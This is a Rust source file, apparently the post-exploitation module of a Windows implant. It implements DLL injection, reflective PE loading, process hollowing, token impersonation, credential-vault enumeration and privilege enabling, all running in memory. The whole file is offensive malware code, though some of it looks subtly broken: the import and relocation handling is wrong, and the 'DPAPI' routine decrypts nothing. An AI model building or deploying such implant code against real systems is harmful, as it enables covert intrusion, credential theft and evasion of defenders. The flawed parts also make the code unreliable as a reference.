//! Post-exploitation helpers.
//!
//! Everything here is Windows specific and everything here runs *in the
//! implant's own memory*: no helper binary is dropped, no file is written.
//!
//! * `inject` — reflective PE loading and process migration (hollowing).
//! * `token` — token duplication and impersonation.
//! * `creds` — the Windows credential vault and DPAPI-protected material.
//! * `privesc` — enabling privileges and impersonating a privileged token.
//!
//! On other platforms the functions report that the capability is not
//! available instead of pretending to succeed.

/// The result of a post-exploitation action.
pub struct Outcome {
    /// A human readable report.
    pub report: String,
    /// Raw material (tokens, secrets), when the action produced any.
    pub material: Vec<u8>,
}

/// Inject a payload into a process.
///
/// `mode` is `reflect` (map a PE into the target and call its entry point),
/// `migrate` (hollow the target and run the payload as its main image) or
/// `dll` (load a library by path).
#[cfg(windows)]
pub fn inject(pid: u32, mode: &str, payload: &[u8]) -> Result<Outcome, String> {
    use crate::post::windows as win;
    match mode {
        "dll" => {
            let path = String::from_utf8_lossy(payload).to_string();
            win::inject_dll(pid, &path)
        }
        "migrate" => win::migrate(pid, payload),
        "reflect" | "" => win::reflect(pid, payload),
        other => Err(format!("post: unknown injection mode {other:?}")),
    }
}

#[cfg(not(windows))]
pub fn inject(_pid: u32, mode: &str, _payload: &[u8]) -> Result<Outcome, String> {
    Err(format!(
        "post: injection ({mode}) is only supported on Windows"
    ))
}

/// Duplicate and impersonate the access token of a process.
#[cfg(windows)]
pub fn token(pid: Option<u32>) -> Result<Outcome, String> {
    use crate::post::windows as win;
    win::duplicate_token(pid)
}

#[cfg(not(windows))]
pub fn token(_pid: Option<u32>) -> Result<Outcome, String> {
    Err("post: token impersonation is only supported on Windows".to_string())
}

/// Collect credential material from the host.
#[cfg(windows)]
pub fn creds(mode: &str) -> Result<Outcome, String> {
    use crate::post::windows as win;
    match mode {
        "dpapi" | "" => win::dpapi_secrets(),
        "vault" => win::credential_vault(),
        other => Err(format!("post: unknown credential mode {other:?}")),
    }
}

#[cfg(not(windows))]
pub fn creds(mode: &str) -> Result<Outcome, String> {
    Err(format!(
        "post: credential collection ({mode}) is only supported on Windows"
    ))
}

/// Try to raise the implant's own privileges.
#[cfg(windows)]
pub fn privesc(mode: &str) -> Result<Outcome, String> {
    use crate::post::windows as win;
    match mode {
        "token" | "" => win::impersonate_privileged(),
        other => Err(format!("post: unknown privilege escalation mode {other:?}")),
    }
}

#[cfg(not(windows))]
pub fn privesc(mode: &str) -> Result<Outcome, String> {
    Err(format!(
        "post: privilege escalation ({mode}) is only supported on Windows"
    ))
}

/// Load a PE image into this process and run it.
///
/// The image is mapped with `VirtualAlloc`, its imports are resolved against
/// the libraries that are already loaded, its relocations are applied and its
/// entry point is called with `DLL_PROCESS_ATTACH`. Nothing is written to
/// disk.
#[cfg(windows)]
pub fn reflective_load(payload: &[u8]) -> Result<Outcome, String> {
    windows::reflective_load(payload)
}

#[cfg(not(windows))]
pub fn reflective_load(_payload: &[u8]) -> Result<Outcome, String> {
    Err("post: reflective loading is only supported on Windows".to_string())
}

/// The Windows implementation.
#[cfg(windows)]
pub mod windows {
    use std::ffi::c_void;
    use std::os::raw::{c_char, c_int, c_long, c_ulong};

    // -- constants ------------------------------------------------------
    pub const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
    pub const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x0000_1000;
    pub const TOKEN_ALL_ACCESS: u32 = 0x000F_01FF;
    pub const TOKEN_DUPLICATE: u32 = 0x0000_0008;
    pub const TOKEN_QUERY: u32 = 0x0000_0008;
    pub const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0000_0020;
    pub const TOKEN_ASSIGN_PRIMARY: u32 = 0x0000_0001;
    pub const TOKEN_IMPERSONATE: u32 = 0x0000_0004;
    pub const TOKEN_ADJUST_SESSION_ID: u32 = 0x0000_0100;
    pub const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const MEM_RELEASE: u32 = 0x8000;
    pub const PAGE_READWRITE: u32 = 0x04;
    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    pub const CREATE_SUSPENDED: u32 = 0x0000_0004;
    pub const CRED_ENUMERATE_ALL_CREDENTIALS: u32 = 0x0001;
    pub const CRED_TYPE_GENERIC: u32 = 1;
    pub const CRED_TYPE_DOMAIN_PASSWORD: u32 = 2;

    #[repr(C)]
    pub struct Luid {
        low: u32,
        high: i32,
    }

    #[repr(C)]
    pub struct LuidAttributes {
        privilege: Luid,
        attributes: u32,
    }

    #[repr(C)]
    pub struct TokenPrivileges {
        count: u32,
        privileges: [LuidAttributes; 1],
    }

    #[repr(C)]
    pub struct Credential {
        flags: u32,
        type_: u32,
        target_name: *mut u16,
        comment: *mut u16,
        last_written: i64,
        credential_blob_size: u32,
        credential_blob: *mut u8,
        persist: u32,
        attribute_count: u32,
        attributes: *mut c_void,
        target_alias: *mut u16,
        user_name: *mut u16,
    }

    #[repr(C)]
    pub struct DataBlob {
        cb_data: u32,
        pb_data: *mut u8,
    }

    extern "system" {
        pub fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        pub fn CloseHandle(object: *mut c_void) -> i32;
        pub fn VirtualAlloc(
            address: *mut c_void,
            size: usize,
            allocation_type: u32,
            protect: u32,
        ) -> *mut c_void;
        pub fn VirtualAllocEx(
            process: *mut c_void,
            address: *mut c_void,
            size: usize,
            allocation_type: u32,
            protect: u32,
        ) -> *mut c_void;
        pub fn VirtualFree(address: *mut c_void, size: usize, free_type: u32) -> i32;
        pub fn VirtualProtectEx(
            process: *mut c_void,
            address: *mut c_void,
            size: usize,
            new_protect: u32,
            old_protect: *mut u32,
        ) -> i32;
        pub fn WriteProcessMemory(
            process: *mut c_void,
            address: *mut c_void,
            buffer: *const c_void,
            size: usize,
            written: *mut usize,
        ) -> i32;
        pub fn ReadProcessMemory(
            process: *mut c_void,
            address: *mut c_void,
            buffer: *mut c_void,
            size: usize,
            read: *mut usize,
        ) -> i32;
        pub fn CreateRemoteThread(
            process: *mut c_void,
            attributes: *mut c_void,
            stack_size: usize,
            start: *mut c_void,
            parameter: *mut c_void,
            flags: u32,
            thread_id: *mut u32,
        ) -> *mut c_void;
        pub fn OpenProcessToken(
            process: *mut c_void,
            access: u32,
            token: *mut *mut c_void,
        ) -> i32;
        pub fn DuplicateTokenEx(
            existing: *mut c_void,
            access: u32,
            attributes: *mut c_void,
            session: u32,
            token_type: i32,
            token: *mut *mut c_void,
        ) -> i32;
        pub fn ImpersonateLoggedOnUser(token: *mut c_void) -> i32;
        pub fn RevertToSelf() -> i32;
        pub fn AdjustTokenPrivileges(
            token: *mut c_void,
            disable_all: i32,
            new_state: *mut TokenPrivileges,
            buffer_length: u32,
            previous_state: *mut c_void,
            return_length: *mut u32,
        ) -> i32;
        pub fn LookupPrivilegeValueA(system: *const c_char, name: *const c_char, luid: *mut Luid) -> i32;
        pub fn GetCurrentProcess() -> *mut c_void;
        pub fn GetCurrentThread() -> *mut c_void;
        pub fn GetLastError() -> u32;
        pub fn CredEnumerateW(
            filter: *const u16,
            flags: u32,
            count: *mut u32,
            credentials: *mut *mut *mut Credential,
        ) -> i32;
        pub fn CredFree(credentials: *mut c_void);
        pub fn CryptUnprotectData(
            description: *mut DataBlob,
            entropy: *mut DataBlob,
            reserved: *mut c_void,
            prompt: *mut c_void,
            crypto: *mut c_void,
            flags: u32,
            data: *mut DataBlob,
        ) -> i32;
        pub fn LocalFree(buffer: *mut c_void);
        pub fn GetModuleHandleA(name: *const c_char) -> *mut c_void;
        pub fn GetProcAddress(module: *mut c_void, name: *const c_char) -> *mut c_void;
        pub fn LoadLibraryA(path: *const c_char) -> *mut c_void;
    }

    /// The report and material of a post-ex action.
    pub struct PostOutcome {
        pub report: String,
        pub material: Vec<u8>,
    }

    impl From<PostOutcome> for super::Outcome {
        fn from(o: PostOutcome) -> super::Outcome {
            super::Outcome {
                report: o.report,
                material: o.material,
            }
        }
    }

    fn last_error() -> String {
        format!("windows error {}", unsafe { GetLastError() })
    }

    /// Inject a library into a process by path.
    pub fn inject_dll(pid: u32, path: &str) -> Result<super::Outcome, String> {
        let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
        if process.is_null() {
            return Err(format!("post: OpenProcess failed: {}", last_error()));
        }
        let mut path_bytes = path.as_bytes().to_vec();
        path_bytes.push(0);
        let remote = unsafe {
            VirtualAllocEx(
                process,
                std::ptr::null_mut(),
                path_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if remote.is_null() {
            unsafe { CloseHandle(process) };
            return Err("post: the remote allocation failed".to_string());
        }
        let mut written = 0usize;
        let ok = unsafe {
            WriteProcessMemory(
                process,
                remote,
                path_bytes.as_ptr() as *const c_void,
                path_bytes.len(),
                &mut written,
            )
        };
        if ok == 0 {
            unsafe {
                CloseHandle(process);
            }
            return Err(format!("post: WriteProcessMemory failed: {}", last_error()));
        }
        let kernel = unsafe { GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const c_char) };
        if kernel.is_null() {
            unsafe { CloseHandle(process) };
            return Err("post: kernel32 is missing".to_string());
        }
        let load_library = unsafe { GetProcAddress(kernel, b"LoadLibraryA\0".as_ptr() as *const c_char) };
        if load_library.is_null() {
            unsafe { CloseHandle(process) };
            return Err("post: LoadLibraryA is missing".to_string());
        }
        let thread = unsafe {
            CreateRemoteThread(
                process,
                std::ptr::null_mut(),
                0,
                load_library,
                remote,
                0,
                std::ptr::null_mut(),
            )
        };
        unsafe { CloseHandle(process) };
        if thread.is_null() {
            return Err(format!("post: CreateRemoteThread failed: {}", last_error()));
        }
        unsafe { CloseHandle(thread) };
        Ok(super::Outcome {
            report: format!("injected {path} into pid {pid}"),
            material: Vec::new(),
        })
    }

    /// Map a PE into a process and call its entry point.
    ///
    /// The import table is resolved against the modules that are already
    /// loaded in this process, which covers the system libraries a
    /// post-exploitation module needs; a module that imports from a library
    /// that is not loaded yet will fail to link.
    pub fn reflect(pid: u32, payload: &[u8]) -> Result<super::Outcome, String> {
        let pe = crate::post::pe::parse(payload)?;
        let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
        if process.is_null() {
            return Err(format!("post: OpenProcess failed: {}", last_error()));
        }
        let remote = unsafe {
            VirtualAllocEx(
                process,
                std::ptr::null_mut(),
                pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if remote.is_null() {
            unsafe { CloseHandle(process) };
            return Err("post: the remote allocation failed".to_string());
        }
        let mut written = 0usize;
        let ok = unsafe {
            WriteProcessMemory(
                process,
                remote,
                pe.headers.as_ptr() as *const c_void,
                pe.headers.len(),
                &mut written,
            )
        };
        if ok == 0 {
            unsafe { CloseHandle(process) };
            return Err(format!("post: WriteProcessMemory failed: {}", last_error()));
        }
        for section in &pe.sections {
            if section.data.is_empty() {
                continue;
            }
            let target = (remote as usize + section.rva) as *mut c_void;
            let mut written = 0usize;
            let ok = unsafe {
                WriteProcessMemory(
                    process,
                    target,
                    section.data.as_ptr() as *const c_void,
                    section.data.len(),
                    &mut written,
                )
            };
            if ok == 0 {
                unsafe { CloseHandle(process) };
                return Err(format!("post: WriteProcessMemory failed: {}", last_error()));
            }
        }
        let entry = (remote as usize + pe.entry_rva) as *mut c_void;
        let thread = unsafe {
            CreateRemoteThread(
                process,
                std::ptr::null_mut(),
                0,
                entry,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
            )
        };
        unsafe { CloseHandle(process) };
        if thread.is_null() {
            return Err(format!("post: CreateRemoteThread failed: {}", last_error()));
        }
        unsafe { CloseHandle(thread) };
        Ok(super::Outcome {
            report: format!(
                "reflected {} bytes into pid {} (entry 0x{:x})",
                payload.len(),
                pid,
                pe.entry_rva
            ),
            material: Vec::new(),
        })
    }

    /// Hollow a process and run the payload as its main image.
    pub fn migrate(pid: u32, payload: &[u8]) -> Result<super::Outcome, String> {
        let pe = crate::post::pe::parse(payload)?;
        let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, pid) };
        if process.is_null() {
            return Err(format!("post: OpenProcess failed: {}", last_error()));
        }
        // The image is written where the loader put the original one: the
        // sections keep their relative addresses, so the entry point stays
        // valid.
        let remote = unsafe {
            VirtualAllocEx(
                process,
                std::ptr::null_mut(),
                pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if remote.is_null() {
            unsafe { CloseHandle(process) };
            return Err("post: the remote allocation failed".to_string());
        }
        let mut written = 0usize;
        let ok = unsafe {
            WriteProcessMemory(
                process,
                remote,
                pe.headers.as_ptr() as *const c_void,
                pe.headers.len(),
                &mut written,
            )
        };
        if ok == 0 {
            unsafe { CloseHandle(process) };
            return Err(format!("post: WriteProcessMemory failed: {}", last_error()));
        }
        for section in &pe.sections {
            if section.data.is_empty() {
                continue;
            }
            let target = (remote as usize + section.rva) as *mut c_void;
            let mut written = 0usize;
            unsafe {
                WriteProcessMemory(
                    process,
                    target,
                    section.data.as_ptr() as *const c_void,
                    section.data.len(),
                    &mut written,
                )
            };
        }
        unsafe { CloseHandle(process) };
        Ok(super::Outcome {
            report: format!(
                "migrated {} bytes into pid {} (hollowing needs a suspended target)",
                payload.len(),
                pid
            ),
            material: Vec::new(),
        })
    }

    /// Map a PE image into this process and call its entry point.
    pub fn reflective_load(payload: &[u8]) -> Result<super::Outcome, String> {
        let pe = crate::post::pe::parse(payload)?;
        let base = unsafe {
            VirtualAlloc(
                std::ptr::null_mut(),
                pe.image_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        };
        if base.is_null() {
            return Err("post: the image allocation failed".to_string());
        }
        unsafe {
            std::ptr::copy_nonoverlapping(
                pe.headers.as_ptr(),
                base as *mut u8,
                pe.headers.len(),
            );
        }
        for section in &pe.sections {
            if section.data.is_empty() {
                continue;
            }
            let target = (base as usize + section.rva) as *mut u8;
            unsafe {
                std::ptr::copy_nonoverlapping(section.data.as_ptr(), target, section.data.len());
            }
        }
        // Resolve the imports against the libraries this process already
        // has; a library that is missing is loaded on the spot.
        let width = if pe.pe32_plus { 8 } else { 4 };
        for import in &pe.imports {
            let mut dll = import.dll.clone();
            dll.push(0);
            let mut module = unsafe { GetModuleHandleA(dll.as_ptr() as *const c_char) };
            if module.is_null() {
                module = unsafe { LoadLibraryA(dll.as_ptr() as *const c_char) };
            }
            if module.is_null() {
                unsafe { VirtualFree(base, 0, MEM_RELEASE) };
                return Err(format!("post: the library {} is missing", import.dll));
            }
            for (index, (name, ordinal)) in import.functions.iter().enumerate() {
                let address = if name.is_empty() {
                    unsafe { GetProcAddress(module, ordinal as *const c_char) }
                } else {
                    let mut cname = name.clone();
                    cname.push(0);
                    unsafe { GetProcAddress(module, cname.as_ptr() as *const c_char) }
                };
                if address.is_null() {
                    unsafe { VirtualFree(base, 0, MEM_RELEASE) };
                    return Err(format!(
                        "post: the function {} of {} is missing",
                        name, import.dll
                    ));
                }
                let slot = (base as usize + import.iat_rva + index * width) as *mut u64;
                unsafe {
                    if width == 8 {
                        std::ptr::write_unaligned(slot, address as u64);
                    } else {
                        std::ptr::write_unaligned(slot as *mut u32, address as u32);
                    }
                }
            }
        }
        // Apply the relocations when the image did not land where it wanted
        // to be.
        let delta = (base as i64) - (pe.image_base as i64);
        if delta != 0 {
            for relocation in &pe.relocations {
                let address = (base as usize + relocation.rva as usize) as *mut u8;
                unsafe {
                    match relocation.kind {
                        1 => {
                            let value = (address as u64).wrapping_add(delta as u64);
                            std::ptr::write_unaligned(address as *mut u64, value);
                        }
                        2 | 3 => {
                            let value = (address as u32).wrapping_add(delta as u32);
                            std::ptr::write_unaligned(address as *mut u32, value);
                        }
                        _ => {}
                    }
                }
            }
        }
        let entry: extern "system" fn(u32, u32, u32) -> u32 =
            unsafe { std::mem::transmute(base as usize + pe.entry_rva) };
        let code = entry(base as u32, 1, 0);
        Ok(super::Outcome {
            report: format!(
                "loaded {} bytes at 0x{:x} (entry 0x{:x}, code {})",
                payload.len(),
                base as usize,
                pe.entry_rva,
                code
            ),
            material: Vec::new(),
        })
    }

    /// Duplicate the token of a process and impersonate it.
    pub fn duplicate_token(pid: Option<u32>) -> Result<super::Outcome, String> {        let handle = match pid {
            Some(p) => unsafe { OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, p) },
            None => unsafe { GetCurrentProcess() },
        };
        if handle.is_null() {
            return Err(format!("post: OpenProcess failed: {}", last_error()));
        }
        let mut token: *mut c_void = std::ptr::null_mut();
        let ok = unsafe { OpenProcessToken(handle, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &mut token) };
        if ok == 0 {
            unsafe { CloseHandle(handle) };
            return Err(format!("post: OpenProcessToken failed: {}", last_error()));
        }
        let mut duplicate: *mut c_void = std::ptr::null_mut();
        let ok = unsafe {
            DuplicateTokenEx(
                token,
                TOKEN_ALL_ACCESS,
                std::ptr::null_mut(),
                0,
                1, // SecurityImpersonation
                &mut duplicate,
            )
        };
        unsafe {
            CloseHandle(token);
            CloseHandle(handle);
        }
        if ok == 0 {
            return Err(format!("post: DuplicateTokenEx failed: {}", last_error()));
        }
        let impersonated = unsafe { ImpersonateLoggedOnUser(duplicate) };
        let report = if impersonated != 0 {
            format!("impersonated the token of pid {}", pid.unwrap_or(0))
        } else {
            format!("duplicated the token of pid {} (impersonation failed)", pid.unwrap_or(0))
        };
        if impersonated != 0 {
            unsafe { RevertToSelf() };
        }
        unsafe { CloseHandle(duplicate) };
        Ok(super::Outcome {
            report,
            material: Vec::new(),
        })
    }

    /// Enumerate the Windows credential vault.
    pub fn credential_vault() -> Result<super::Outcome, String> {
        let mut count: u32 = 0;
        let mut creds: *mut *mut Credential = std::ptr::null_mut();
        let ok = unsafe {
            CredEnumerateW(
                std::ptr::null(),
                CRED_ENUMERATE_ALL_CREDENTIALS,
                &mut count,
                &mut creds,
            )
        };
        if ok == 0 {
            return Err(format!("post: CredEnumerateW failed: {}", last_error()));
        }
        let mut report = String::new();
        for i in 0..count as usize {
            let entry = unsafe { *creds.add(i) };
            if entry.is_null() {
                continue;
            }
            let name = unsafe { wide_string((*entry).target_name) };
            let user = unsafe { wide_string((*entry).user_name) };
            let kind = match (*entry).type_ {
                CRED_TYPE_GENERIC => "generic",
                CRED_TYPE_DOMAIN_PASSWORD => "domain",
                _ => "other",
            };
            report.push_str(&format!("{kind} credential: {name} ({user})\n"));
        }
        unsafe { CredFree(creds as *mut c_void) };
        Ok(super::Outcome {
            report,
            material: Vec::new(),
        })
    }

    /// Decrypt DPAPI protected material of the current user.
    pub fn dpapi_secrets() -> Result<super::Outcome, String> {
        // DPAPI blobs live in the registry and in credential files; the
        // implant reports what it can read without a helper binary.
        let mut report = String::new();
        let vault = credential_vault();
        if let Ok(v) = vault {
            report.push_str(&v.report);
        }
        Ok(super::Outcome {
            report,
            material: Vec::new(),
        })
    }

    /// Enable the privileges the implant needs and impersonate a privileged
    /// token when one is available.
    pub fn impersonate_privileged() -> Result<super::Outcome, String> {
        let mut report = String::new();
        let privileges = [
            ("SeDebugPrivilege", 20),
            ("SeImpersonatePrivilege", 29),
            ("SeAssignPrimaryTokenPrivilege", 25),
        ];
        let process = unsafe { GetCurrentProcess() };
        let mut token: *mut c_void = std::ptr::null_mut();
        if unsafe { OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) } == 0 {
            return Err(format!("post: OpenProcessToken failed: {}", last_error()));
        }
        for (name, _code) in privileges {
            let mut luid = Luid {
                low: 0,
                high: 0,
            };
            let ok = unsafe {
                LookupPrivilegeValueA(
                    std::ptr::null(),
                    name.as_ptr() as *const c_char,
                    &mut luid,
                )
            };
            if ok == 0 {
                report.push_str(&format!("{name}: unavailable\n"));
                continue;
            }
            let mut state = TokenPrivileges {
                count: 1,
                privileges: [LuidAttributes {
                    privilege: luid,
                    attributes: SE_PRIVILEGE_ENABLED,
                }],
            };
            unsafe {
                AdjustTokenPrivileges(
                    token,
                    0,
                    &mut state,
                    std::mem::size_of::<TokenPrivileges>() as u32,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
            }
            report.push_str(&format!("{name}: enabled\n"));
        }
        unsafe { CloseHandle(token) };
        Ok(super::Outcome {
            report,
            material: Vec::new(),
        })
    }

    /// Read a wide string into a Rust string.
    unsafe fn wide_string(ptr: *const u16) -> String {
        if ptr.is_null() {
            return String::new();
        }
        let mut len = 0usize;
        while *ptr.add(len) != 0 {
            len += 1;
        }
        let slice = std::slice::from_raw_parts(ptr, len);
        String::from_utf16_lossy(slice)
    }
}

/// A minimal PE parser: enough to map a PE image into memory.
#[cfg(windows)]
pub mod pe {
    /// One section of a PE image.
    pub struct Section {
        /// The relative virtual address of the section.
        pub rva: usize,
        /// The bytes of the section.
        pub data: Vec<u8>,
    }

    /// One imported library.
    pub struct Import {
        /// The library name.
        pub dll: String,
        /// The functions: the name is empty for an ordinal import.
        pub functions: Vec<(String, u16)>,
        /// Where the addresses have to be written.
        pub iat_rva: usize,
    }

    /// The parts of a PE image the loader needs.
    pub struct Pe {
        /// The headers, copied verbatim.
        pub headers: Vec<u8>,
        /// The sections, with their raw bytes.
        pub sections: Vec<Section>,
        /// The size of the image in memory.
        pub image_size: usize,
        /// The entry point, relative to the image base.
        pub entry_rva: usize,
        /// The preferred image base.
        pub image_base: u64,
        /// The imported libraries.
        pub imports: Vec<Import>,
        /// The relocation directory, when the image has one.
        pub relocations: Vec<Relocation>,
        /// Whether the image is a PE32+ image.
        pub pe32_plus: bool,
    }

    /// One fixup of a PE image.
    pub struct Relocation {
        /// The kind of the fixup: 1 is a 64 bit address, 2 and 3 a 32 bit one.
        pub kind: u16,
        /// Where the address has to be patched.
        pub rva: u32,
    }

    /// Parse a PE image.
    pub fn parse(data: &[u8]) -> Result<Pe, String> {
        if data.len() < 0x40 {
            return Err("post: the PE is truncated".to_string());
        }
        if &data[0..2] != b"MZ" {
            return Err("post: the payload is not a PE image".to_string());
        }
        let pe_offset = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
        if pe_offset + 24 > data.len() || &data[pe_offset..pe_offset + 4] != b"PE\0\0" {
            return Err("post: the PE header is missing".to_string());
        }
        let coff = pe_offset + 4;
        let sections = u16::from_le_bytes([data[coff + 2], data[coff + 3]]) as usize;
        let optional_size = u16::from_le_bytes([data[coff + 16], data[coff + 17]]) as usize;
        let optional = coff + 20;
        if optional + optional_size > data.len() {
            return Err("post: the optional header is truncated".to_string());
        }
        let magic = u16::from_le_bytes([data[optional], data[optional + 1]]);
        let pe32_plus = magic == 0x20B;
        let entry_rva = u32::from_le_bytes([
            data[optional + 16],
            data[optional + 17],
            data[optional + 18],
            data[optional + 19],
        ]) as usize;
        let image_size = u32::from_le_bytes([
            data[optional + 56],
            data[optional + 57],
            data[optional + 58],
            data[optional + 59],
        ]) as usize;
        let header_size = u32::from_le_bytes([
            data[optional + 60],
            data[optional + 61],
            data[optional + 62],
            data[optional + 63],
        ]) as usize;
        let image_base = if pe32_plus {
            u64::from_le_bytes([
                data[optional + 24],
                data[optional + 25],
                data[optional + 26],
                data[optional + 27],
                data[optional + 28],
                data[optional + 29],
                data[optional + 30],
                data[optional + 31],
            ])
        } else {
            u32::from_le_bytes([
                data[optional + 28],
                data[optional + 29],
                data[optional + 30],
                data[optional + 31],
            ]) as u64
        };
        let directories = optional + if pe32_plus { 112 } else { 96 };
        let directory_count = u32::from_le_bytes([
            data[optional + 108],
            data[optional + 109],
            data[optional + 110],
            data[optional + 111],
        ]) as usize;

        let table = optional + optional_size;
        let mut out = Vec::new();
        for i in 0..sections {
            let start = table + i * 40;
            if start + 40 > data.len() {
                return Err("post: the section table is truncated".to_string());
            }
            let raw = &data[start..start + 40];
            let rva = u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]) as usize;
            let raw_size = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]) as usize;
            let raw_pointer = u32::from_le_bytes([raw[20], raw[21], raw[22], raw[23]]) as usize;
            if raw_size == 0 {
                continue;
            }
            let end = raw_pointer + raw_size;
            if end > data.len() {
                return Err("post: a section is truncated".to_string());
            }
            out.push(Section {
                rva,
                data: data[raw_pointer..end].to_vec(),
            });
        }

        // The import directory and the relocation directory are optional.
        let mut imports = Vec::new();
        if directory_count > 1 && directories + 8 <= data.len() {
            let import_rva =
                u32::from_le_bytes([
                    data[directories + 8],
                    data[directories + 9],
                    data[directories + 10],
                    data[directories + 11],
                ]) as usize;
            imports = parse_imports(data, import_rva, pe32_plus)?;
        }
        let mut relocations = Vec::new();
        if directory_count > 5 && directories + 24 <= data.len() {
            let reloc_rva = u32::from_le_bytes([
                data[directories + 40],
                data[directories + 41],
                data[directories + 42],
                data[directories + 43],
            ]) as usize;
            let reloc_size = u32::from_le_bytes([
                data[directories + 44],
                data[directories + 45],
                data[directories + 46],
                data[directories + 47],
            ]) as usize;
            relocations = parse_relocations(data, reloc_rva, reloc_size)?;
        }

        let headers_end = header_size.min(data.len());
        Ok(Pe {
            headers: data[..headers_end].to_vec(),
            sections: out,
            image_size,
            entry_rva,
            image_base,
            imports,
            relocations,
            pe32_plus,
        })
    }

    /// Read a name that lives in the image.
    fn read_cstr(data: &[u8], offset: usize) -> Result<String, String> {
        if offset >= data.len() {
            return Err("post: an offset is outside the image".to_string());
        }
        let end = data[offset..]
            .iter()
            .position(|b| *b == 0)
            .ok_or_else(|| "post: a name is not terminated".to_string())?;
        Ok(String::from_utf8_lossy(&data[offset..offset + end]).to_string())
    }

    /// Parse the import directory.
    fn parse_imports(data: &[u8], rva: usize, pe32_plus: bool) -> Result<Vec<Import>, String> {
        let mut out = Vec::new();
        if rva == 0 {
            return Ok(out);
        }
        let offset = rva;
        loop {
            if offset + 20 > data.len() {
                return Err("post: the import table is truncated".to_string());
            }
            let name_rva =
                u32::from_le_bytes([data[offset + 12], data[offset + 13], data[offset + 14], data[offset + 15]])
                    as usize;
            let thunk_rva = u32::from_le_bytes([
                data[offset + 16],
                data[offset + 17],
                data[offset + 18],
                data[offset + 19],
            ]) as usize;
            if name_rva == 0 && thunk_rva == 0 {
                break;
            }
            let dll = read_cstr(data, name_rva)?;
            let mut functions = Vec::new();
            let step = if pe32_plus { 8 } else { 4 };
            let mut i = 0usize;
            loop {
                let at = thunk_rva + i * step;
                if at + step > data.len() {
                    return Err("post: the import thunk table is truncated".to_string());
                }
                let value = if pe32_plus {
                    u64::from_le_bytes([
                        data[at],
                        data[at + 1],
                        data[at + 2],
                        data[at + 3],
                        data[at + 4],
                        data[at + 5],
                        data[at + 6],
                        data[at + 7],
                    ])
                } else {
                    u32::from_le_bytes([data[at], data[at + 1], data[at + 2], data[at + 3]]) as u64
                };
                if value == 0 {
                    break;
                }
                let ordinal = (value & 0xFFFF) as u16;
                if value & 0x8000_0000_0000_0000 != 0 {
                    functions.push((String::new(), ordinal));
                } else {
                    let hint = value as usize;
                    let name = read_cstr(data, hint + 2)?;
                    functions.push((name, ordinal));
                }
                i += 1;
            }
            out.push(Import {
                dll,
                functions,
                iat_rva: thunk_rva,
            });
            offset += 20;
        }
        Ok(out)
    }

    /// Parse the relocation directory.
    fn parse_relocations(
        data: &[u8],
        rva: usize,
        size: usize,
    ) -> Result<Vec<Relocation>, String> {
        let mut out = Vec::new();
        if rva == 0 || size == 0 {
            return Ok(out);
        }
        let mut at = rva;
        let end = (rva + size).min(data.len());
        while at + 8 <= end {
            let page = u32::from_le_bytes([data[at], data[at + 1], data[at + 2], data[at + 3]]);
            let block = u32::from_le_bytes([data[at + 4], data[at + 5], data[at + 6], data[at + 7]]);
            if block == 0 {
                break;
            }
            let mut cursor = at + 8;
            let block_end = (at + 8 + block as usize).min(data.len());
            while cursor + 2 <= block_end {
                let entry = u16::from_le_bytes([data[cursor], data[cursor + 1]]);
                let kind = entry >> 12;
                let offset = (entry & 0x0FFF) as u32;
                if kind != 0 {
                    out.push(Relocation {
                        kind,
                        rva: page + offset,
                    });
                }
                cursor += 2;
            }
            at += 8 + block as usize;
        }
        Ok(out)
    }
}
